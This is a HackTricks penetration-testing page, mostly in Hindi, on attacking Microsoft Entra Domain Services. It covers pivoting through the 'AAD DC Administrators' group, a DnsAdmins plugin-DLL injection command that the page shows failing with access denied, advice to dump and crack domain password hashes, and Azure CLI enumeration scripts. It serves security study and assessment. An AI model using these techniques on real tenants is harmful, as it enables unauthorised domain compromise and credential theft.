# Az - Microsoft Entra Domain Services

{{#include ../../../banners/hacktricks-training.md}}

## डोमेन सर्विसेज

Microsoft Entra Domain Services आपको Azure में Active Directory deploy करने की अनुमति देता है बिना Domain Controllers को manage किए (असल में आपके पास उन पर access भी नहीं होता)।

इसका मुख्य उद्देश्य यह है कि आप उन legacy applications को cloud में चला सकें जो modern authentication methods इस्तेमाल नहीं कर सकतीं, या ऐसी जगहें जहाँ आप नहीं चाहते कि directory lookups हमेशा on-premises AD DS environment पर वापस जाएँ।

ध्यान दें कि Entra ID में बनाए गए users (जो अन्य active directories से synchronized नहीं हैं) को AD domain service के साथ synchronize करने के लिए आपको उपयोगकर्ता का **पासवर्ड बदलना** होगा ताकि वे नए AD के साथ sync हो सकें। वास्तव में, user तब तक Microsoft Entra ID से Domain Services में synchronized नहीं होता जब तक पासवर्ड बदला न जाए।

> [!WARNING]
> भले ही आप एक नया active directory domain बना रहे हों, आप उसे पूरी तरह manage नहीं कर पाएँगे (जब तक कि कुछ misconfigurations का exploit न करें), जिसका मतलब है कि default तौर पर आप उदाहरण के लिए AD में सीधे users नहीं बना सकते। आप उन्हें **Entra ID से users synchronize करके** बनाते हैं। आप तय कर सकते हैं कि सभी users synchronize हों (यहाँ तक कि वे भी जो other on-premise ADs से synced हैं), केवल cloud users (Entra ID में बनाए गए users), या उन्हें और भी **फ़िल्टर** कर सकते हैं।

> [!NOTE]
> सामान्य तौर पर, नए domain की configuration में लचीलापन कम होने और यह तथ्य कि ADs आमतौर पर पहले से ही on-premise होते हैं, के कारण यह Entra ID और AD के बीच मुख्य integration नहीं है, परन्तु इसे compromise करने का तरीका जानना फिर भी दिलचस्प है।

### Pivoting

Generated **`AAD DC Administrators`** group के सदस्य उन VMs पर local admin permissions प्राप्त करते हैं जो managed domain से domain-joined हैं (domain controllers पर नहीं), क्योंकि उन्हें local administrators group में जोड़ा जाता है। इस group के सदस्य **Remote Desktop** का उपयोग करके domain-joined VMs से दूरस्थ रूप से कनेक्ट भी कर सकते हैं, और ये नीचे दिए गए समूहों के भी सदस्य होते हैं:

- **`Denied RODC Password Replication Group`**: यह एक समूह है जो उन users और groups को निर्दिष्ट करता है जिनके passwords RODCs (Read-Only Domain Controllers) पर cached नहीं किए जा सकते।
- **`Group Policy Creators Owners`**: यह समूह सदस्यों को domain में Group Policies बनाने की अनुमति देता है। हालांकि, इसके सदस्य users या groups पर group policies apply नहीं कर सकते और न ही मौजूदा GPOs को edit कर सकते हैं, इसलिए यह environment में उतना दिलचस्प नहीं है।
- **`DnsAdmins`**: यह समूह DNS settings को manage करने की अनुमति देता है और पिछले समय में [escalate privileges and compromise the domain](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmin#dnsadmins) के लिए abused किया गया था, हालांकि इस environment में उस attack का परीक्षण करने पर जाँच किया गया कि vulnerability patched है:
```text
dnscmd TDW52Y80ZE26M1K.azure.hacktricks-training.com /config /serverlevelplugindll \\10.1.0.6\c$\Windows\Temp\adduser.dll

DNS Server failed to reset registry property.
Status = 5 (0x00000005)
Command failed:  ERROR_ACCESS_DENIED     5    0x5
```
Note that to grant these permissions, inside the AD the group **`AAD DC Administrators`** group is made a member of the previous groups, and also the GPO **`AADDC Computers GPO`** is adding as Local Administrators all the members of the domain group **`AAD DC Administrators`**.

Entra ID से Domain Services के साथ बनाए गए AD में pivot करना सीधा है — बस किसी user को समूह **`AAD DC Administrators`** में जोड़ें, domain की किसी/सभी मशीनों में RDP से प्रवेश करें और आप डेटा चुरा सकेंगे और साथ ही **compromise the domain.**

हालाँकि, domain से Entra ID की ओर pivot करना उतना आसान नहीं है क्योंकि domain से कुछ भी Entra ID में synchronized नहीं हो रहा है। फिर भी, हमेशा उन सभी VMs की metadata की जाँच करें जो joined हैं क्योंकि उनके assigned managed identities में रोचक permissions हो सकती हैं। साथ ही **dump all the users passwords from the domain** और उन्हें crack करने की कोशिश करें ताकि आप Entra ID / Azure में लॉगिन कर सकें।

> [!NOTE]
> Note that in the past other vulnerabilities in this managed AD were found that allowed to compromise the DCs, [like this one](https://www.secureworks.com/research/azure-active-directory-domain-services-escalation-of-privilege?utm_source=chatgpt.com). एक attacker जो DC को compromise कर लेता है, वह बहुत आसानी से maintain persistence बनाए रख सकता है बिना Azure admins के इसे नोटिस किए या (यहाँ तक कि) इसे हटाने में सक्षम हुए।

### Enumeration
```bash
# Get configured domain services domains (you can add more subs to check in more subscriptions)
az rest --method post \
--url "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" \
--body '{
"subscriptions": [
"0ce1297c-9153-425d-3229-f51093614377"
],
"query": "resources | where type == \"microsoft.aad/domainservices\"",
"options": {
"$top": 16,
"$skip": 0,
"$skipToken": ""
}
}'

# Get domain configuration
az rest --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/<domain-name>?api-version=2022-12-01&healthdata=true"
## e.g.
az rest --url "https://management.azure.com/subscriptions/0ce1297c-9153-425d-3229-f51093614377/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/azure.hacktricks-training.com?api-version=2022-12-01&healthdata=true"

# Based on the VNet assigned to the domain services, you can enumerate the VMs in the domain

subscription_id="0ce1297c-9153-425d-3229-f51093614377"
vnet_name="aadds-vnet"

# Retrieve all VMs in the subscription
vm_list=$(az vm list --subscription "$subscription_id" --query "[].{Name:name, ResourceGroup:resourceGroup}" --output tsv)

# Iterate through each VM to check their VNet connection
echo "VMs connected to VNet '$vnet_name':"
while IFS=$'\t' read -r vm_name resource_group; do
nic_ids=$(az vm show --subscription "$subscription_id" --name "$vm_name" --resource-group "$resource_group" --query "networkProfile.networkInterfaces[].id" --output tsv)

for nic_id in $nic_ids; do
subnet_id=$(az network nic show --ids "$nic_id" --query "ipConfigurations[0].subnet.id" --output tsv)

if [[ $subnet_id == *"virtualNetworks/$vnet_name"* ]]; then
echo "VM Name: $vm_name, Resource Group: $resource_group"
fi
done
done <<< "$vm_list"
```
{{#include ../../../banners/hacktricks-training.md}}
